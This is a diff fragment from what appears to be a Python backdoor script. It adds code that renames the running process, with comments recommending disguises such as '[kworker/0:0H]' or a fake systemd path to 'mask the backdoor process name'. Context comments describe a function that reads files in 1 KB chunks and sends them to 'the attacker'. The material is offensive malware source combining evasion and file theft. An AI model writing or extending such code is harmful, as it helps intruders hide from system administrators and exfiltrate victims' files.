@@ -6,7 +6,13 @@ import os
 
 
 import platform
+import setproctitle
 
+# Mask the backdoor process name
+# Recommend something like "[kworker/0:0H]" or
+# "/usr/bin/systemd/systemd-login"
+title = "backdoor"   #replace "backdoor" with your custom process title
+setproctitle.setproctitle(title)
 
 # In the transfer function, we first check if the file exisits in the first place, if not we will notify the attacker
 # otherwise, we will create a loop where each time we iterate we will read 1 KB of the file and send it, since the
